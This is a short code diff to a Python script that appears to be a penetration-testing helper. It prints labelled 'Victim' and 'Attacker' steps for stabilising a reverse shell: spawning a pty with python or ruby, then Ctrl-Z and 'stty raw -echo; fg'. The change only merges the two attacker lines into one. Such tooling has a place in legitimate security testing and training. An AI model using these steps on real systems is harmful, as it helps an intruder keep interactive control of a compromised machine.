@@ -254,8 +254,7 @@ def extra(ip,port,file):
     print("\033[38;5;208mVictim:\033[0m ruby ruby -e exec \"/bin/sh\"\n")
     print("\033[38;5;208mVictim:\033[0m python -c 'import pty; pty.spawn(\"/bin/bash\")'")
     print("\033[38;5;208mVictim:\033[0m Ctrl-Z")
-    print("\033[38;5;208mAttacker:\033[0m stty raw -echo")
-    print("\033[38;5;208mAttacker:\033[0m fg")
+    print("\033[38;5;208mAttacker:\033[0m stty raw -echo; fg")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
